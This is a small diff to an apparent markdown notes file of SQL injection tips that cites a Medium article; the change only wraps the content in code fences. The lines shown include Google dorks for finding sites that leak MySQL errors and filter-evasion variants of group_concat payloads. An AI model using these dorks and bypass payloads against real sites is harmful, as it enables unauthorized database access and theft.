@@ -2,7 +2,7 @@
 
 https://medium.com/nerd-for-tech/some-tips-for-sql-injections-764e1a254a29
 
-
+```
 inurl:”id=” & intext:”Warning: mysql_fetch_assoc()"
 inurl:”id=” & intext:”Warning: mysql_fetch_array()"
 inurl:”id=” & intext:”Warning: mysql_num_rows()"
@@ -334,3 +334,5 @@ group_concat(/*!50000table_name*/)
 /*!12345GroUP_ConCat*/()
 /*!50000gRouP_cOnCaT*/()
 /*!50000Gr%6fuP_c%6fnCAT*/()
+
+```
